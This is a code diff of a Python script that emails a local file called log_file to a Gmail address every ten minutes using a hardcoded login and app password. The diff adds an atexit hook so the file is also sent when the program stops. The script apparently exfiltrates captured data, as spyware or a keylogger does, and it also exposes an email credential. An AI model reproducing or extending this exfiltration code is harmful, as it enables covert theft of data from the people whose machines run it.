@@ -3,6 +3,7 @@ from email.message import EmailMessage
 from pathlib import Path
 import smtplib
 import os
+import atexit
 
 print("elindult")
 
@@ -33,10 +34,15 @@ def send_file_via_email(file_path, to_email):
         server.login("spwincome@gmail.com", "zocv svuo rjek smrl")
         server.send_message(msg)
 
+def send_on_exit():
+    send_file_via_email(log_file, "spwincome@gmail.com")
+atexit.register(send_on_exit) 
+
 # test‑loop:end file every 10 minutes
 while True:
     send_file_via_email(log_file, "spwincome@gmail.com")
     time.sleep(600)  # 10 minutes
+
 
 
 
